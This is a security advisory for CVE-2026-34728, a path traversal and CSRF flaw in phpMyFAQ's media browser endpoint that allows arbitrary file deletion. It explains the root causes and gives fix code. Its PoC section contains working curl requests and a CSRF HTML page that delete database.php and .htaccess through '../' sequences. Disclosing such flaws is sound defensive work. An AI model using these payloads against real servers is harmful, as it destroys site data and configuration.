# [H] phpMyFAQ: Path Traversal - Arbitrary File Deletion in MediaBrowserController

## Summary
Severity: High
Advisory: GHSA-38m8-xrfj-v38x
CVE: CVE-2026-34728
CWE: CWE-22
Ecosystem: Packagist
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:N/I:H/A:H (CVSS_V3)
Published: 2026-04-01
Source: https://github.com/advisories/GHSA-38m8-xrfj-v38x
Type: github-advisory

## Affected
- Packagist: `phpmyfaq/phpmyfaq` — affected >=0 <4.1.1

## Details
### Summary
The `MediaBrowserController::index()` method handles file deletion for the media browser. When the `fileRemove` action is triggered, the user-supplied `name` parameter is concatenated with the base upload directory path without any path traversal validation. The `FILTER_SANITIZE_SPECIAL_CHARS` filter only encodes HTML special characters (`&`, `'`, `"`, `<`, `>`) and characters with ASCII value < 32, and does not prevent directory traversal sequences like `../`. Additionally, the endpoint does not validate CSRF tokens, making it exploitable via CSRF attacks.

### Details

**Affected File:** `phpmyfaq/src/phpMyFAQ/Controller/Administration/Api/MediaBrowserController.php`

**Lines 43-66:**
```php
#[Route(path: 'media-browser', name: 'admin.api.media.browser', methods: ['GET'])]
public function index(Request $request): JsonResponse|Response
{
    $this->userHasPermission(PermissionType::FAQ_EDIT);
    // ...
    $data = json_decode($request->getContent());
    $action = Filter::filterVar($data->action, FILTER_SANITIZE_SPECIAL_CHARS);

    if ($action === 'fileRemove') {
        $file = Filter::filterVar($data->name, FILTER_SANITIZE_SPECIAL_CHARS);
        $file = PMF_CONTENT_DIR . '/user/images/' . $file;

        if (file_exists($file)) {
            unlink($file);
        }
        // Returns success without checking if deletion was within intended directory
    }
}
```

**Root Causes:**
1. **No path traversal prevention:** `FILTER_SANITIZE_SPECIAL_CHARS` does not remove or encode `../` sequences. It only encodes HTML special characters.
2. **No CSRF protection:** The endpoint does not call `Token::verifyToken()`. Compare with `ImageController::upload()` which validates CSRF tokens at line 48.
3. **No basename() or realpath() validation:** The code does not use `basename()` to strip directory components or `realpath()` to verify the resolved path stays within the intended directory.
4. **HTTP method mismatch:** The route is defined as `methods: ['GET']` but reads the request body via `$request->getContent()`. This bypasses typical GET-only CSRF protections that rely on same-origin checks for GET requests.

**Comparison with secure implementation in the same codebase:**

The `ImageController::upload()` method (same directory) properly validates file names:
```php
if (preg_match("/([^\w\s\d\-_~,;:\[\]\(\).])|([\.]{2,})/", (string) $file->getClientOriginalName())) {
    // Rejects files with path traversal sequences
}
```

The `FilesystemStorage::normalizePath()` method also properly validates paths:

```php
foreach ($segments as $segment) {
    if ($segment === '..' || $segment === '') {
        throw new StorageException('Invalid storage path.');
    }
}
```

### PoC

**Direct exploitation (requires authenticated admin session):**
```bash
# Delete the database configuration file
curl -X GET 'https://target.example.com/admin/api/media-browser' \
  -H 'Content-Type: application/json' \
  -H 'Cookie: PHPSESSID=valid_admin_session' \
  -d '{"action":"fileRemove","name":"../../../content/core/config/database.php"}'

# Delete the .htaccess file to disable Apache security rules
curl -X GET 'https://target.example.com/admin/api/media-browser' \
  -H 'Content-Type: application/json' \
  -H 'Cookie: PHPSESSID=valid_admin_session' \
  -d '{"action":"fileRemove","name":"../../../.htaccess"}'
```

**CSRF exploitation (attacker hosts this HTML page):**
```html
<html>
<body>
<script>
fetch('https://target.example.com/admin/api/media-browser', {
  method: 'GET',
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify({
    action: 'fileRemove',
    name: '../../../content/core/config/database.php'
  }),
  credentials: 'include'
});
</script>
</body>
</html>
```

When an authenticated admin visits the attacker's page, the database configuration file (`database.php`) is deleted, effectively taking down the application.

### Impact

- **Server compromise:** Deleting `content/core/config/database.php` causes total application failure (database connection loss).
- **Security bypass:** Deleting `.htaccess` or `web.config` can expose sensitive directories and files.
- **Data loss:** Arbitrary file deletion on the server filesystem.
- **Chained attacks:** Deleting log files to cover tracks, or deleting security configuration files to weaken other protections.


### Remediation

1. **Add path traversal validation:**
```php
if ($action === 'fileRemove') {
    $file = basename(Filter::filterVar($data->name, FILTER_SANITIZE_SPECIAL_CHARS));
    $targetPath = realpath(PMF_CONTENT_DIR . '/user/images/' . $file);
    $allowedDir = realpath(PMF_CONTENT_DIR . '/user/images');

    if ($targetPath === false || !str_starts_with($targetPath, $allowedDir . DIRECTORY_SEPARATOR)) {
        return $this->json(['error' => 'Invalid file path'], Response::HTTP_BAD_REQUEST);
    }

    if (file_exists($targetPath)) {
        unlink($targetPath);
    }
}
```

2. **Add CSRF protection:**
```php
if (!Token::getInstance($this->session)->verifyToken('pmf-csrf-token', $request->query->get('csrf'))) {
    return $this->json(['error' => 'Invalid CSRF token'], Response::HTTP_UNAUTHORIZED);
}
```

3. **Change HTTP method to POST or DELETE** to align with proper HTTP semantics.

## References
- https://github.com/thorsten/phpMyFAQ/security/advisories/GHSA-38m8-xrfj-v38x
- https://nvd.nist.gov/vuln/detail/CVE-2026-34728
- https://github.com/thorsten/phpMyFAQ
- https://github.com/thorsten/phpMyFAQ/releases/tag/4.1.1
